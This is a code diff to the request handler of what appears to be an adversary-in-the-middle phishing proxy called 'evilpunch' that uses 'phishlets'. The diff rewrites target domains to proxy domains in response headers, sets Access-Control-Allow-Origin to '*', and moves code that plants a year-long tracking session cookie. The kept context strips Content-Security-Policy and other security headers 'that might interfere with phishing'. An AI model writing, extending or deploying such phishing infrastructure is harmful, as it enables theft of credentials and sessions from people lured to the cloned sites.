@@ -2757,9 +2757,11 @@ async def proxy_handler(request):
                 
                 debug_log(f"Cache decision for {url_path}: {'CACHE' if should_cache else 'NO_CACHE'}", "DEBUG")
                 # === END STATIC FILE CACHING ===
-                
+                print(f"\n ---- resp.headers: {resp.headers}--------\n --------------------------------")
                 # Patch response headers
                 patched_headers = patch_headers_in(resp.headers, incoming_host, target_host)
+                print(f"\n ---- patched_headers: {patched_headers}--------\n --------------------------------")
+                
                 for h in ("content-length", "Content-Length", "content-encoding", "Content-Encoding"):
                     if h in patched_headers:
                         del patched_headers[h]
@@ -2793,7 +2795,10 @@ async def proxy_handler(request):
                     # Set credentials to true for CORS requests
                     patched_headers["Access-Control-Allow-Credentials"] = "true"
                     debug_log("Set Access-Control-Allow-Credentials to true", "DEBUG")
-                
+                else:
+                    # set to *
+                    patched_headers["Access-Control-Allow-Origin"] = "*"
+                    debug_log("Set Access-Control-Allow-Origin to *", "DEBUG")
                 # Remove security headers that might interfere with phishing
                 security_headers_to_remove = [
                     "Content-Security-Policy",
@@ -2816,46 +2821,7 @@ async def proxy_handler(request):
                 if request.transport and request.transport.is_closing():
                     debug_log("Client disconnected before response preparation", "WARN")
                     return web.Response(status=499)  # Client Closed Request
-
-                stream_response = web.StreamResponse(status=resp.status, headers=patched_headers)
                 
-                # Add session cookie to response if we have session info
-                if hasattr(request, 'get') and request.get('session_cookie'):
-                    session_cookie = request['session_cookie']
-                    phishlet_id = request.get('phishlet_id')
-                    proxy_domain = request.get('proxy_domain', '')
-                    
-                    # Set cookie with appropriate attributes and phishlet-specific name
-                    cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
-                    
-                    # Set cookie domain to base domain for cross-subdomain access
-                    base_domain = proxy_domain
-                    if '.' in base_domain:
-                        # For subdomains, use the base domain
-                        base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
-                    
-                    stream_response.set_cookie(
-                        cookie_name,
-                        session_cookie,
-                        max_age=31536000,  # 1 year
-                        httponly=True,      # Prevent XSS
-                        secure=False,       # Set to False for HTTP, True for HTTPS
-                        samesite='Lax',     # CSRF protection
-                        domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
-                    )
-                    debug_log(f"Added session cookie to response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
-                
-                # Wrap prepare call in try-catch to handle race condition
-                try:
-                    await stream_response.prepare(request)
-                    debug_log("Stream response prepared", "DEBUG")
-                except Exception as prepare_error:
-                    if "Cannot write to closing transport" in str(prepare_error) or "ClientConnectionResetError" in str(prepare_error):
-                        debug_log("Client disconnected during response preparation", "WARN")
-                        return web.Response(status=499)  # Client Closed Request
-                    else:
-                        debug_log(f"Response preparation error: {prepare_error}", "ERROR")
-                        raise prepare_error
 
                 try:
                     # CRITICAL FIX: Build replacement mapping ONLY from the current phishlet, not from all phishlets
@@ -2932,6 +2898,7 @@ async def proxy_handler(request):
                         else:
                             debug_log(f"  Secondary replacement: {tgt} -> {prox}", "DEBUG")
                     
+                    
                     # Debug: Verify the replacement order is correct
                     debug_log(f"Final replacement order (longest first): {[(t, p) for t, p in ordered_replacements]}", "DEBUG")
                     
@@ -2946,6 +2913,67 @@ async def proxy_handler(request):
                         debug_log(f"⚠️  WARNING: tools.fluxxset.com replacement NOT FOUND in ordered_replacements!", "WARN")
                     
                     debug_log("=== END REQUEST SETUP ===", "DEBUG")
+                    
+                    # Apply additional header replacements based on ordered_replacements
+                    if ordered_replacements:
+                        debug_log(f"  Applying ordered replacements to patched headers: --------\n --------------------------------")
+                        for key, value in patched_headers.items():
+                            # Check if any target from ordered_replacements exists in the header value
+                            new_value = value
+                            for target, proxy in ordered_replacements:
+                                if target in new_value:
+                                    new_value = new_value.replace(target, proxy)
+                                    debug_log(f"  Replaced in patched header {key}: {target} -> {proxy}", "DEBUG")
+                            
+                            # Update the patched header if any replacements were made
+                            if new_value != value:
+                                patched_headers[key] = new_value
+                                debug_log(f"  Final patched header {key}: {value} -> {new_value}", "DEBUG")
+                        debug_log(f"  Applied ordered replacements to patched headers: --------\n --------------------------------")
+                    debug_log(f"  Final patched headers: --------\n --------------------------------")
+                    debug_log(f"  {patched_headers}", "DEBUG")
+                    debug_log(f"  --------------------------------")
+                    
+                    # Create the stream response with the fully patched headers
+                    stream_response = web.StreamResponse(status=resp.status, headers=patched_headers)
+                    
+                    # Add session cookie to response if we have session info
+                    if hasattr(request, 'get') and request.get('session_cookie'):
+                        session_cookie = request['session_cookie']
+                        phishlet_id = request.get('phishlet_id')
+                        proxy_domain = request.get('proxy_domain', '')
+                        
+                        # Set cookie with appropriate attributes and phishlet-specific name
+                        cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
+                        
+                        # Set cookie domain to base domain for cross-subdomain access
+                        base_domain = proxy_domain
+                        if '.' in base_domain:
+                            # For subdomains, use the base domain
+                            base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
+                        
+                        stream_response.set_cookie(
+                            cookie_name,
+                            session_cookie,
+                            max_age=31536000,  # 1 year
+                            httponly=True,      # Prevent XSS
+                            secure=False,       # Set to False for HTTP, True for HTTPS
+                            samesite='Lax',     # CSRF protection
+                            domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
+                        )
+                        debug_log(f"Added session cookie to response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
+                    
+                    # Wrap prepare call in try-catch to handle race condition
+                    try:
+                        await stream_response.prepare(request)
+                        debug_log("Stream response prepared", "DEBUG")
+                    except Exception as prepare_error:
+                        if "Cannot write to closing transport" in str(prepare_error) or "ClientConnectionResetError" in str(prepare_error):
+                            debug_log("Client disconnected during response preparation", "WARN")
+                            return web.Response(status=499)  # Client Closed Request
+                        else:
+                            debug_log(f"Response preparation error: {prepare_error}", "ERROR")
+                            raise prepare_error
                     
                     max_key_len = max((len(k) for k, _ in ordered_replacements), default=0)
                     overlap = max(0, max_key_len - 1)
